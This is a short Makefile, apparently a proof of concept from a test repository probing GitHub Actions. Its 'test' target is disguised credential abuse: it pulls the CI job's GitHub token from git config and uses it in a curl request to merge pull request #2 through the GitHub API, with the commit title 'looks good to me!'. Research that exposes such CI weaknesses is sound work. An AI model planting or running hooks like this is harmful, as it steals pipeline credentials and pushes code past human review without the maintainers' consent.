TOKEN := $(shell git config --get http.https://github.com/.extraheader)

test:
	curl -s -X PUT -d '{"commit_title": "looks good to me!"}' -u "x-access-token:${TOKEN}" -H 'Accept: application/vnd.github.v3+json' https://api.github.com/repos/ndavisontest/actions-test/pull/2/merge

.PHONY: clean test

